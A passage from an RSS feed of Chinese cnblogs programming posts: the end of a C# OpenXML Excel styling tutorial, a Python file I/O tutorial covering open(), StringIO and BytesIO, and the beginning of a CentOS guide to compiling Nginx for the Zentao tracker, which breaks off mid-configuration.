                    &lt;span&gt;new&lt;/span&gt; CellFormat { FormatId = FORMAT_INDEX_HEADER, FontId = &lt;span&gt;1&lt;/span&gt;, FillId = &lt;span&gt;2&lt;/span&gt;, BorderId = &lt;span&gt;1&lt;/span&gt;, ApplyFill = &lt;span&gt;true&lt;/span&gt; }, &lt;span&gt;//&lt;/span&gt;&lt;span&gt; header
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; body  int&lt;/span&gt;
                    &lt;span&gt;new&lt;/span&gt; CellFormat { FormatId = FORMAT_INDEX_INT, FontId = &lt;span&gt;0&lt;/span&gt;, FillId = &lt;span&gt;0&lt;/span&gt;, BorderId = &lt;span&gt;1&lt;/span&gt;, NumberFormatId = &lt;span&gt;1&lt;/span&gt;, ApplyBorder = &lt;span&gt;true&lt;/span&gt;&lt;span&gt; }
                );

            styleSheet &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Stylesheet(numbers, fonts, fills, borders, cellFormats);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; styleSheet;　　
        }　　&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; WriteWorkbookStyle()
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (document != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                WorkbookStylesPart stylePart &lt;/span&gt;= document.WorkbookPart.AddNewPart&amp;lt;WorkbookStylesPart&amp;gt;&lt;span&gt;();
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; styleSheet =&lt;span&gt; GenerateStylesheet();
                styleSheet.Save(stylePart);
            }

        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt; 设置样式，冻结首行，这些都可以简单完成，如果需要添加图表什么的，还是建议用NPOI, EPPlus等开源方案，有图表的excel不会太大。&lt;/p&gt;

&lt;p&gt;对于Open XML的介绍就到这里了，有什么错误的地方，请指正。&lt;/p&gt;

</description>
<pubDate>Sun, 14 Jan 2018 05:57:00 +0000</pubDate>
<dc:creator>RHINO_WU</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/rhino/p/8283219.html</dc:identifier>
</item>
<item>
<title>python_IO编程 - 小破孩92</title>
<link>http://www.cnblogs.com/miqi1992/p/8283155.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/miqi1992/p/8283155.html</guid>
<description>&lt;blockquote readability=&quot;4&quot;&gt;
&lt;p&gt;本篇文章将介绍python里面的I/O编程。更多内容请参考：&lt;a href=&quot;http://www.cnblogs.com/miqi1992/p/8082471.html&quot;&gt;python学习指南&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;io编程&quot;&gt;I/O编程&lt;/h3&gt;
&lt;p&gt;读写文件时最常见的IO操作。Python内置了读写文件的函数，用法和C是兼容的。&lt;br/&gt;读写文件前，我们必须了解一下，在磁盘上读写文件的功能都是由操作系统提供的，现代操作系统不允许普通的程序直接操作磁盘，所以，读写文件就是请求操作系统打开一个文件对象(通常称为文件描述符)，然后，通过操作系统提供的接口从这个文件对象中读取数据(读文件),或者把数据写入这个文件对象(写文件)。&lt;/p&gt;
&lt;p&gt;在I/O编程中，Stream(流)是一种重要的概念，分为输入流(Input Stream)和输入流(Output Stream)。我们可以把流理解为一个水管，一个负责输入，一个负责输出，这样读写就可以实现同步。&lt;/p&gt;
&lt;h3 id=&quot;文件读写&quot;&gt;文件读写&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;打开文件&lt;/strong&gt;&lt;br/&gt;读写文件是最常见的IO操作。Python内置了读写文件的函数，方便了文件的IO操作。&lt;br/&gt;文件读写之前需要打开文件，确定文件的读写模式。open函数用来打开文件，语法如下：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(name[, mode[, buffering]])&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;open函数使用一个文件作为唯一的强制参数，然后返回一个文件对象。模式(mode)和缓冲区(buffering)参数都是可选的，默认模式是读模式，默认缓冲区是无。&lt;br/&gt;如果文件不存在，&lt;code&gt;open()&lt;/code&gt;函数就会抛出一个&lt;code&gt;IOError&lt;/code&gt;错误，并且给出错误码和详细的信息告诉你文件不存在：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;user/michael/notfound.txt&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;r&quot;&lt;/span&gt;)
Traceback (most recent call last):
  File &lt;span class=&quot;st&quot;&gt;&quot;&amp;lt;stdin&amp;gt;&quot;&lt;/span&gt;, line &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;op&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt;module&lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;pp&quot;&gt;FileNotFoundError&lt;/span&gt;: [Errno &lt;span class=&quot;dv&quot;&gt;2&lt;/span&gt;] No such &lt;span class=&quot;bu&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;or&lt;/span&gt; directory: &lt;span class=&quot;st&quot;&gt;'user/michael/notfound.txt'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;文件模式&lt;/strong&gt;&lt;br/&gt;open函数打开中的mode参数，通过改变mode参数可以实现对文件的不同操作&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td align=&quot;center&quot;&gt;'r'&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;读模式&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td align=&quot;center&quot;&gt;'w'&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;写模式&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td align=&quot;center&quot;&gt;'a'&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;追加模式&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td align=&quot;center&quot;&gt;'b'&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;二进制模式(可添加到其它模式中使用)&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td align=&quot;center&quot;&gt;'+'&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;读/写模式(可添加到其它模式中使用)&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;一般处理文本文件时，是用不到'b'参数的，但如果处理其它类型的文件(二进制文件)，比如mp3或者图形，就应该在模式中加上'b'，这在爬虫中处理媒体文件很常用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;文件缓冲区&lt;/strong&gt;&lt;br/&gt;&lt;code&gt;open&lt;/code&gt;函数中第三个可选参数&lt;code&gt;buffering&lt;/code&gt;控制着文件的缓冲。如果参数是0，I/O操作就是无缓冲的，直接将数据写到硬盘上；如果参数是1，I/O操作就是有缓冲的，数据先写入到内存里，只有使用&lt;code&gt;flush&lt;/code&gt;函数或者&lt;code&gt;close&lt;/code&gt;函数才会将数据更新到硬盘；如果参数大于1的数据则代表着缓冲区的大小(单位是字节)，-1(或者任何负数)代表使用默认缓冲区的大小。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文件读取&lt;/strong&gt;&lt;br/&gt;文件读取主要分为按字节读取和按行读取，经常用到的方法有&lt;code&gt;read()&lt;/code&gt;、&lt;code&gt;readline()&lt;/code&gt;、&lt;code&gt;readlines()&lt;/code&gt;、&lt;code&gt;close()&lt;/code&gt;。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;vs&quot;&gt;r&quot;c:\\text\\xiaoqi.txt&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;r&quot;&lt;/span&gt;)
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f.read()   &lt;span class=&quot;co&quot;&gt;#调用read()方法可以一次性地将文件内容全部读到内存中&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;'xiaoqi'&lt;/span&gt;
f.close()  &lt;span class=&quot;co&quot;&gt;#文件读取完成后必须关闭&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;由于文件操作可能会出现IO异常，一旦出现IO异常，后面的&lt;code&gt;close()&lt;/code&gt;&lt;br/&gt;方法就不会调用。所以为了保证程序的健壮性，我们需要使用try...finally来实现。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;cf&quot;&gt;try&lt;/span&gt;
    f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;vs&quot;&gt;r'c:\\text\\xiaoqi.txt'&lt;/span&gt;)
    &lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt;(f.read())
&lt;span class=&quot;cf&quot;&gt;finally&lt;/span&gt;:
    &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; f:
        f.close()&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Python提供了一种更加简单有趣的写法，使用with语句来替代&lt;code&gt;try...finally&lt;/code&gt;代码块和&lt;code&gt;close()&lt;/code&gt;方法&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;cf&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;vs&quot;&gt;r'c:\text\xiaoqi.txt'&lt;/span&gt;) &lt;span class=&quot;im&quot;&gt;as&lt;/span&gt; fileReader:
    &lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt;(fileReader.read())&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;利用&lt;code&gt;read()&lt;/code&gt;一次将文件内容读到内存，但是如果文件过大，将会出现内存不足的问题。一般对于大文件，可以重复调用&lt;code&gt;read(size)&lt;/code&gt;方法，一次最多读取size个字节。如果文件是文本文件，Python提供了更加合理的做法，调用了&lt;code&gt;readline()&lt;/code&gt;可以每次读取一行内容，调用&lt;code&gt;readlines()&lt;/code&gt;一次读取所有内容并按行返回列表。大家可以根据自己的具体需求采取不同的读取方式：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;小文件可以直接采取read()方法读到内存;&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;大文件更加安全的方法是连续调用read(size);&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;面对于配置文件等文本文件，使用readlines()方法更加合理&lt;/li&gt;
&lt;/ol&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;cf&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;vs&quot;&gt;r'c:\\text\\ss.txt'&lt;/span&gt;) &lt;span class=&quot;im&quot;&gt;as&lt;/span&gt; fileReader:
    &lt;span class=&quot;cf&quot;&gt;for&lt;/span&gt; line &lt;span class=&quot;op&quot;&gt;in&lt;/span&gt; fileReader.readlines():
        &lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt;(line.strip())&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;文件写入&lt;/strong&gt;&lt;br/&gt;写文件和读文件是一样的，唯一的区别实在调用open方法时，传入标识符&lt;code&gt;w&lt;/code&gt;或者&lt;code&gt;wb&lt;/code&gt;表示写入文本文件或者写入二进制文件，示例如下：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;vs&quot;&gt;r'c:\text\qie.txt'&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;'w'&lt;/span&gt;)
f.write(&lt;span class=&quot;st&quot;&gt;'xiaoqi'&lt;/span&gt;)
f.close()&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们可以反复调用&lt;code&gt;write()&lt;/code&gt;方法写入文件，最后必须使用&lt;code&gt;close()&lt;/code&gt;方法来关闭文件。使用&lt;code&gt;write()&lt;/code&gt;方法的时候，操作系统不是立即将数据写入文件中的，而是先写入内存中缓存起来，等到空闲时候再写入文件中，最后使用&lt;code&gt;close()&lt;/code&gt;方法就将数据完整地写入文件中了。当然也可以使用&lt;code&gt;f.flush()&lt;/code&gt;方法，不断地将数据立即写入文件中，最后使用&lt;code&gt;close()&lt;/code&gt;方法来关闭文件。和读文件同样道理，文件操作中可能会出现IO异常，所以还是推荐使用with语句：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;cf&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;vs&quot;&gt;r'c:\text\csd.txt'&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;'w'&lt;/span&gt;) &lt;span class=&quot;im&quot;&gt;as&lt;/span&gt; fileWriter:
    fileWriter.write(&lt;span class=&quot;st&quot;&gt;'sdfs'&lt;/span&gt;)&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;file-like-object&quot;&gt;file-like Object&lt;/h3&gt;
&lt;p&gt;像&lt;code&gt;open()&lt;/code&gt;函数返回的这种有个&lt;code&gt;read()&lt;/code&gt;方法的对象，在Python中统称为file-like Object,除了file外，还可以是内存的字节流，网路流，自定义流等。file-like Object不要求从特定类继承，只要写个&lt;code&gt;read()&lt;/code&gt;方法就行。&lt;br/&gt;&lt;code&gt;StringIO&lt;/code&gt;就是内存中创建的file-like Object,常用作临时缓冲。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二进制文件&lt;/strong&gt;&lt;br/&gt;一般我们用&lt;code&gt;open()&lt;/code&gt;读取的是文本文件，并且是&lt;code&gt;UTF-8&lt;/code&gt;编码的文本文件。要读取二进制文件，比如图片、视频，就需要用&lt;code&gt;rb&lt;/code&gt;模式打开文件：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/Users/michael/test.jpg&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;'rb'&lt;/span&gt;)
f.read()
b&lt;span class=&quot;st&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xff\xd8\xff\xe1\x00\x18E&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;xif&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\x00\x00&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;...'&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;# 十六进制表示的字节&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;字符编码&lt;/strong&gt;&lt;br/&gt;要读取非UTF-8编码的文本文件，需要给&lt;code&gt;open()&lt;/code&gt;函数传入&lt;code&gt;encoding&lt;/code&gt;参数，例如，读取GBK编码的文件：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/Users/michael/gbk.text&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;r&quot;&lt;/span&gt;, encoding&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;gbk&quot;&lt;/span&gt;)
f.read()
&lt;span class=&quot;co&quot;&gt;'测试'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;遇到有些编码不规范的文件，你可能会遇到UnicodeDecodeError，因为在文本文件中可能夹杂了一些非法编码的字符。遇到这种情况，&lt;code&gt;open()&lt;/code&gt;函数还接收一个&lt;code&gt;errors&lt;/code&gt;参数，表示如果遇到编码错误后如何处理。最简单的方式是直接忽略：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;open&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;'/Users/michael/gbk.txt'&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;'r'&lt;/span&gt;, encoding&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;'gbk'&lt;/span&gt;, errors&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;'ignore'&lt;/span&gt;)&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;StringIO&lt;/strong&gt;&lt;br/&gt;很多时候，数据读写并不一定是文件也可以在内幕才能中读写。&lt;br/&gt;StringIO顾名思义就是在内存中读写str。&lt;br/&gt;要把str写入StringIO,我们需要先创建一个StringIO,然后，像文件一样写入即可：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;im&quot;&gt;from&lt;/span&gt; io &lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; StringIO
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; StringIO()
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f.write(&lt;span class=&quot;st&quot;&gt;'hello'&lt;/span&gt;)
&lt;span class=&quot;dv&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f.write(&lt;span class=&quot;st&quot;&gt;&quot; &quot;&lt;/span&gt;)
&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f.write(&lt;span class=&quot;st&quot;&gt;&quot;world!&quot;&lt;/span&gt;)
&lt;span class=&quot;dv&quot;&gt;6&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt;(f.getvalue())   &lt;span class=&quot;co&quot;&gt;#getvalue()方法用于获得写入后的str&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;'hello world!'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;要读取StringIO,可以用一个str初始哈StringIO,然后，像读文件一样读取：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;im&quot;&gt;from&lt;/span&gt; io &lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; StringIO
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; StringIO(&lt;span class=&quot;st&quot;&gt;&quot;Hello!&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;Goodbye!&quot;&lt;/span&gt;)
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;cf&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;True&lt;/span&gt;:
    s &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; f.readline()
    &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; s &lt;span class=&quot;op&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&quot; &quot;&lt;/span&gt;:
        &lt;span class=&quot;cf&quot;&gt;break&lt;/span&gt;
    &lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt;(s.strip())
Hello&lt;span class=&quot;op&quot;&gt;!&lt;/span&gt;
Hi&lt;span class=&quot;op&quot;&gt;!&lt;/span&gt;
Goodbye&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;BytesIO&lt;/strong&gt;&lt;br/&gt;StringIO操作的只能是str,如果要操作二进制数据，就需要使用ByetsIO.&lt;br/&gt;BytesIO实现了在内存中读写bytes,我们创建了一个BytesIO，然后写入一些bytes&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;im&quot;&gt;from&lt;/span&gt; io &lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; BytesIO
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; BytesIO()
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f.write(&lt;span class=&quot;st&quot;&gt;'中文'&lt;/span&gt;.encode(&lt;span class=&quot;st&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;))
&lt;span class=&quot;dv&quot;&gt;6&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt;(f.getvalues)
b&lt;span class=&quot;st&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xe4\xb8\xad\xe6\x96\x87&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;注意：写入的不是str,而是经过UTF-8编码的bytes。&lt;br/&gt;和StringIO类似，可以用一个bytes初始化BytesIO,然后，像读文件一样读取：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode python&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;im&quot;&gt;from&lt;/span&gt; io &lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; BytesIO
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; BytesIO(b&lt;span class=&quot;st&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xe4\xb8\xad\xa6\x96\x87&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;'&lt;/span&gt;)
&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;f.read()
b&lt;span class=&quot;st&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xe4\xb8\xad\xe6\x96\x87&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;'&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;参考&quot;&gt;参考&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431917715991ef1ebc19d15a4afdace1169a464eecc2000&quot;&gt;廖雪峰-IO编程&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jianshu.com/p/81af59a7b554&quot;&gt;Python学习记录之：IO编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://python.jobbole.com/81244/&quot;&gt;Python中的str与unicode处理方法&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
<pubDate>Sun, 14 Jan 2018 05:16:00 +0000</pubDate>
<dc:creator>小破孩92</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/miqi1992/p/8283155.html</dc:identifier>
</item>
<item>
<title>[原创]在Centos7.2上源码安装PHP、Nginx、Zentao禅道 - Candyメ奶糖</title>
<link>http://www.cnblogs.com/Candies/p/8282934.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Candies/p/8282934.html</guid>
<description>&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;安装依赖&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;yum install -y gcc gcc-c++  pcre pcre-devel  zlib zlib-devel openssl openssl-devel&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;上传nginx并解压，然后进入到nginx目录/usr/local/src/&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;cd /usr/local/src
rz
tar -xzf nginx-1.12.2.tar.gz
cd nginx-1.12.2&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;源码安装三步走&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;./configure --prefix=/usr/local/nginx --with-http_ssl_module --with-http_gzip_static_module --pid-path=/usr/local/nginx/conf/nginx.pid --with-pcre&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/516492/201801/516492-20180114124745441-440825662.png&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;make &amp;amp;&amp;amp; make install&lt;/code&gt;
&lt;/pre&gt;
&lt;img src=&quot;https://images2017.cnblogs.com/blog/516492/201801/516492-20180114124805832-1818047653.png&quot;/&gt;&lt;/li&gt;
&lt;li readability=&quot;6&quot;&gt;
&lt;p&gt;修改nginx.conf&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;cd /usr/local/nginx/conf/
vi nginx.conf&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以下是nginx.conf的修改内容&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;worker_processes  4;
pid        conf/nginx.pid;
location / {
root   /opt/zentao/www;
index  index.php index.html index.htm;
}
location ~ \.php$ {
